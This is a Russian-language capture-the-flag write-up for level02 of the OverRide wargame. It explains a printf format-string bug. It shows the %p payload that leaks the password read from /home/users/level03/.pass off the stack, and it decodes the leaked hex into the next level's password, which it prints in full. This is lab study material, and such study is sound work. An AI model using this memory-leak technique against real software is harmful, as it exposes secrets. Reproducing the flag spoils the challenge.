В source и в gdb disas main мы увидели, что используется метод strncmp для проверки пароля.
А логин можно вводить любой, главное чтобы пароль совпадал.
Пароль читается из файла 3-го уровня и записывается в password_text.
Далее с этой переменной сравнивается подаваемое значение.
Следует нам найти способ, чтобы прочитать содержимое этой переменной, которая содержит пароль.

Сначала файл открывается по пути /home/users/level03/.pass на чтение.
Далее читается fd-шник в переменную. А дальше записывается пароль в переменную password_text.
И закывается обращение к файлу.
strcsnpn - проверяет две строки до определённого байта на вхождение одной строки в другую. Т.е. в нашем случае
проверяет, что есть в конце полученного пароля из фдш-ника есть ли символ следующей строки и проверяет то же самое,
когда мы вводим пароль. Далее ставится конец строки в пароле и юзер нейме, чтобы не было утечки.

А дальше сравнивает пароль введённый с паролем из файла 41 байт. Если не совпадает, то выводит, что нет прав.
Иначе открывает /bin/sh.
Наша цель получить значение из переменной password_text.
В prinft есть уязвимость спецификаторов. Когда спецификаторов больше, чем переменных,
передаваемых для печати, то выводится содержимое стэка.
http://citforum.ru/security/articles/printf/
Соответственно, мы можем получить доступ к содержимому password_text через printf 
уязвимость.
Соответственно, мы вводим спецификатор, который показывает адреса без подачи аргументов.

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
--[ Password: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 
*****************************************
0x7fffffffe4f0(nil)0x250x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x702570257025(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025 does not have access!
level02@OverRide:~$ 

Так мы видим в аргументах, что сначала идут внутренние неизвестные команды, 
дальше идёт 0x7025702570257025 - это и есть %p
А затем неизвестное в hex:
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025 does not have access!

до nil, а дальше снова %p.
Расшифруем через https://www.rapidtables.com/convert/number/hex-to-ascii.html
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d

вводя с конца, т.к. так вводятся адреса в hex:
48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848,
и получаем:
H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH
переворачиваем
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H